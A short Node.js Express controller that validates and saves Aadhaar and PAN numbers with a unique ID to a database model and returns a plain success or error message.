import PanSubmission from "../models/pan_submissions.js";

export const savePanForm = async (req, res) => {
    try {
        const { aadhaar, pan, uniqueid } = req.body;

        // VALIDATION
        if (!uniqueid) {
            return res.json({
                success: false,
                message: "Unique ID missing"
            });
        }

        if (!aadhaar || !pan) {
            return res.json({
                success: false,
                message: "Aadhaar & PAN required"
            });
        }

        // SAVE ENTRY
        const entry = new PanSubmission({
            uniqueid,
            aadhaar,
            pan
        });

        await entry.save();

        // FINAL RESPONSE → ONLY SUCCESS + MESSAGE
        return res.json({
            success: true,
            message: "PAN + Aadhaar saved successfully"
        });

    } catch (e) {
        return res.json({
            success: false,
            message: "Server error"
        });
    }
};
